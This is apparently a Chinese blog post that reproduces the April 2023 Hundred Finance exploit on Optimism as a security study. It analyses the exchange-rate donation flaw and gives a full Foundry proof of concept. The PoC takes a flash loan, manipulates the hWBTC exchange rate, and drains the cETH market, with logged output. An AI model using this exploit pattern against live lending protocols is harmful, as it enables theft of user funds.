[区块链安全-DEFI攻击复现]003-20230415 HundredFinance

2023年4月15日，`OP`链上的`HundredFinance`遭受了攻击，损失高达`7m`美元。

# 攻击介绍

2023年4月19日，`@peckshield`发出警告，`OP`链上的`HundredFinance`遭受攻击，造成`$7m`损失，攻击哈希为`0x6e9ebcdebbabda04fa9f2e3bc21ea8b2e4fb4bf4f4670cb8483e2f0b2604f451`。

<hr />

# 攻击分析

利用<a hrer="https://explorer.phalcon.xyz/tx/optimism/0x6e9ebcdebbabda04fa9f2e3bc21ea8b2e4fb4bf4f4670cb8483e2f0b2604f451">Phalcon</a>开始分析。这个资金流很多，共涉及74笔通证的转移。

直接看调用栈吧：

```
1. 通过闪电贷向Aave Pool V3 借贷 500 WBTC
2. delegateCall L2Pool的flashLoanSimple执行借贷
3. 回调 executeOperation函数执行攻击
4. 赎回WBTC(Hundred WBTC) (用波动性`hwBTC`赎回等额比例的稳定抵押品`wbtc`。)
5. 创建合约
	- 铸造HWBTC
	- 赎回大部分
	- 捐献WBTC,操作HWBTC汇率
	- 根据抵押借款（USDT）之类
	- 赎回
	- 清算
```

原因在哪呢，因为捐献WBTC后，仅剩的`HWBTC`和`WBTC`的比率就被人为操纵了，还有一个原因（因为只有一个人参与进来，原来的质押池子是空的，所以`HWBTC`的流动性很差，很容易被操纵）。

```
CErc20.sol
    function getCashPrior() internal view returns (uint) {
        EIP20Interface token = EIP20Interface(underlying);
        return token.balanceOf(address(this));
    }
    
CToken.sol    
    function exchangeRateStoredInternal() internal view returns (MathError, uint) {
        uint _totalSupply = totalSupply;
        if (_totalSupply == 0) {
            /*
             * If there are no tokens minted:
             *  exchangeRate = initialExchangeRate
             */
            return (MathError.NO_ERROR, initialExchangeRateMantissa);
        } else {
            /*
             * Otherwise:
             *  exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply
             */
            uint totalCash = getCashPrior();
            uint cashPlusBorrowsMinusReserves;
            Exp memory exchangeRate;
            MathError mathErr;

            (mathErr, cashPlusBorrowsMinusReserves) = addThenSubUInt(totalCash, totalBorrows, totalReserves);
            if (mathErr != MathError.NO_ERROR) {
                return (mathErr, 0);
            }

            (mathErr, exchangeRate) = getExp(cashPlusBorrowsMinusReserves, _totalSupply);
            if (mathErr != MathError.NO_ERROR) {
                return (mathErr, 0);
            }

            return (MathError.NO_ERROR, exchangeRate.mantissa);
        }
    }
```

看着还是很复杂，我们用POC来试一试。

<hr />

# POC编写

为简便起见，我仅仅对`ETH`发起攻击：

一开始我们写成这样：

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ 7M US$
// Event : Hundred Finance Hack
// Analysis via https://explorer.phalcon.xyz/tx/optimism/0x6e9ebcdebbabda04fa9f2e3bc21ea8b2e4fb4bf4f4670cb8483e2f0b2604f451
// Attacker : 0x155da45d374a286d383839b1ef27567a15e67528
// Attack Contract : 0x978d0ce23869ec666bfde9868a8514f3d2754982
// Vulnerable Contract : 0x5a5755e1916f547d04ef43176d4cbe0de4503d5d (UnitController)
// Attack Tx : https://optimistic.etherscan.io/tx/0x6e9ebcdebbabda04fa9f2e3bc21ea8b2e4fb4bf4f4670cb8483e2f0b2604f451

// @Info
// Price manipulation

// @Analysis
// DefiHackLab : https://twitter.com/peckshield/status/1647307128267476992

address constant UNIT_ADDRESS = 0x5a5755E1916F547D04eF43176d4cbe0de4503d5d;
address constant WBTC_ADDRESS = 0x68f180fcCe6836688e9084f035309E29Bf0A2095;
address constant USDT_ADDRESS = 0x94b008aA00579c1307B0EF2c499aD98a8ce58e58;
address constant HWBTC_ADDRESS = 0x35594E4992DFefcB0C20EC487d7af22a30bDec60;
address constant HUSDT_ADDRESS = 0xb994B84bD13f7c8dD3af5BEe9dfAc68436DCF5BD;
address constant AAVE_ADDRESS = 0x794a61358D6845594F94dc1DB02A252b5b4814aD;
address constant PRANK_HACKER = 0x155DA45D374A286d383839b1eF27567A15E67528;
address constant CETHER =  0x1A61A72F5Cf5e857f15ee502210b81f8B3a66263;

uint256 constant WBTC_DECIMALS = 8;
uint256 constant HWBTC_DECIMALS = 8;

uint256 constant WBTC_BORROW_AMOUNT = 50 gwei; // 500 WBTC


contract HundredFinanceHacker is Test { // EOA Simulation

    function setUp() public {
        vm.createSelectFork(
            "optimism",
            90760765
        );

        console.log("start with block %d",90760765);
    }

    function testExploit() public {
        console.log("start hacking...");
        address hacker = address(this);
        deal(hacker,1 ether);
        emit log_named_decimal_uint("[Start] Attacker ETH Balance", hacker.balance, 18);
        emit log_named_decimal_uint("[Start] Attacker WBTC Balance", IERC20(WBTC_ADDRESS).balanceOf(address(this)), WBTC_DECIMALS);
        vm.startPrank(PRANK_HACKER);
        emit log_named_decimal_uint("[Start] Initial Attacker HWBTC Balance", IERC20(HWBTC_ADDRESS).balanceOf(address(PRANK_HACKER)), HWBTC_DECIMALS);
        IERC20(HWBTC_ADDRESS).transfer(hacker,IERC20(HWBTC_ADDRESS).balanceOf(address(PRANK_HACKER)));
        vm.stopPrank();
        emit log_named_decimal_uint("[Start] Hacker HWBTC Balance", IERC20(HWBTC_ADDRESS).balanceOf(address(this)), HWBTC_DECIMALS);
        IAaveFlashloan(AAVE_ADDRESS).flashLoanSimple(
            hacker,
            WBTC_ADDRESS,
            WBTC_BORROW_AMOUNT,
            "0",
            0
        );
        emit log_named_decimal_uint("[After] Attacker ETH Balance", hacker.balance, 18);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initator,
        bytes calldata params
    ) external payable returns (bool) {
        console.log("getting flashloan...");
        emit log_named_decimal_uint("[Hacking] Attacker WBTC Balance", IERC20(WBTC_ADDRESS).balanceOf(address(this)), WBTC_DECIMALS);
        emit log_named_decimal_uint("[Hacking] Attacker HWBTC Balance", IERC20(HWBTC_ADDRESS).balanceOf(address(this)), HWBTC_DECIMALS);
        console.log("redeem");
        ICErc20Delegate(HWBTC_ADDRESS).redeem(IERC20(HWBTC_ADDRESS).balanceOf(address(this))-2);
        emit log_named_decimal_uint("[Hacking] Attacker WBTC Balance", IERC20(WBTC_ADDRESS).balanceOf(address(this)), WBTC_DECIMALS);
        emit log_named_decimal_uint("[Hacking] Attacker HWBTC Balance", IERC20(HWBTC_ADDRESS).balanceOf(address(this)), HWBTC_DECIMALS);
        (,,, uint256 exchangeRate_1) = ICErc20Delegate(HWBTC_ADDRESS).getAccountSnapshot(address(this));
        console.log("exchangeRate before manipulation:", exchangeRate_1);
        console.log("Donate to manipulate price");
        uint256 donation = IERC20(WBTC_ADDRESS).balanceOf(address(this));
        IERC20(WBTC_ADDRESS).transfer(HWBTC_ADDRESS,donation);
         (,,, uint256 exchangeRate_2) = ICErc20Delegate(HWBTC_ADDRESS).getAccountSnapshot(address(this));
        console.log("exchangeRate After manipulation:", exchangeRate_2);
        
        address[] memory cTokens = new address[](1);
        cTokens[0] = HWBTC_ADDRESS;
        IUnitroller(UNIT_ADDRESS).enterMarkets(cTokens);

        uint256 amountToBorrow = crETH(CETHER).getCash() -1 ;
        console.log("crETH has %d to borrow", amountToBorrow);
        
        crETH(CETHER).borrow(amountToBorrow);
        emit log_named_decimal_uint("[Hacking] Attacker ETH Balance", address(this).balance, 18);
        emit log_named_decimal_uint("[Hacking] Attacker WBTC Balance", IERC20(WBTC_ADDRESS).balanceOf(address(this)), WBTC_DECIMALS);
        emit log_named_decimal_uint("[Hacking] Attacker HWBTC Balance", IERC20(HWBTC_ADDRESS).balanceOf(address(this)), HWBTC_DECIMALS);
        console.log("redeem");
        // Concat Attack
        ICErc20Delegate(HWBTC_ADDRESS).redeemUnderlying(donation-1);
        emit log_named_decimal_uint("[Hacking] Attacker WBTC Balance", IERC20(WBTC_ADDRESS).balanceOf(address(this)), WBTC_DECIMALS);
        emit log_named_decimal_uint("[Hacking] Attacker HWBTC Balance", IERC20(HWBTC_ADDRESS).balanceOf(address(this)), HWBTC_DECIMALS);
    
        IERC20(WBTC_ADDRESS).approve(msg.sender,IERC20(WBTC_ADDRESS).balanceOf(address(this)));
        return true;
    }

    fallback() payable external{

    }
}

```

显示结果：

```
[PASS] testExploit() (gas: 842959)
Logs:
  start with block 90760765
  start hacking...
  [Start] Attacker ETH Balance: 1.000000000000000000
  [Start] Attacker WBTC Balance: 0.00000000
  [Start] Initial Attacker HWBTC Balance: 15.03167295
  [Start] Hacker HWBTC Balance: 15.03167295
  getting flashloan...
  [Hacking] Attacker WBTC Balance: 500.00000000
  [Hacking] Attacker HWBTC Balance: 15.03167295
  redeem
  [Hacking] Attacker WBTC Balance: 500.30063816
  [Hacking] Attacker HWBTC Balance: 0.00000002
  exchangeRate before manipulation: 500000000000000000
  Donate to manipulate price
  exchangeRate After manipulation: 25015031908500000000000000000
  crETH has 1021915074492787011273 to borrow
  [Hacking] Attacker ETH Balance: 1022.915074492787011273
  [Hacking] Attacker WBTC Balance: 0.00000000
  [Hacking] Attacker HWBTC Balance: 0.00000002
  redeem
  [Hacking] Attacker WBTC Balance: 500.30063815
  [Hacking] Attacker HWBTC Balance: 0.00000001
  [After] Attacker ETH Balance: 1022.915074492787011273
```



这里有几点要说明：

```
1. IUnitroller(UNIT_ADDRESS).enterMarkets(cTokens); // 最终会调用：
        
     /**
     * @notice Add assets to be included in account liquidity calculation
     * @param cTokens The list of addresses of the cToken markets to be enabled
     * @return Success indicator for whether each corresponding market was entered
     */
    function enterMarkets(address[] memory cTokens) public returns (uint[] memory) {
        uint len = cTokens.length;

        uint[] memory results = new uint[](len);
        for (uint i = 0; i < len; i++) {
            CToken cToken = CToken(cTokens[i]);

            results[i] = uint(addToMarketInternal(cToken, msg.sender));
        }

        return results;
    }
```

```
2.ICErc20Delegate(HWBTC_ADDRESS).redeemUnderlying(donation-1);
为什么不直接`redeem`？
如果直接用         ICErc20Delegate(HWBTC_ADDRESS).redeem(2);
则会报错失败：
原因是：会在`redeemAllowedInternal`中进行校验，如果全拿走抵押就失败了，所以拒绝。
```

```
3. 这里只取走了ETH，实际上黑客对多个资产都发起了攻击，并且对一种资产都建了一个合约，最终还要liquidateBorrow进行清算，否则如果原来还剩`HWBTC`就无法持续攻击了，一定要清零。
```

<hr />

# 总结

这次攻击真的很难。黑客水平的确很高。教训的话就是`reserver`和`balanceOf`的关系需要无比谨慎！



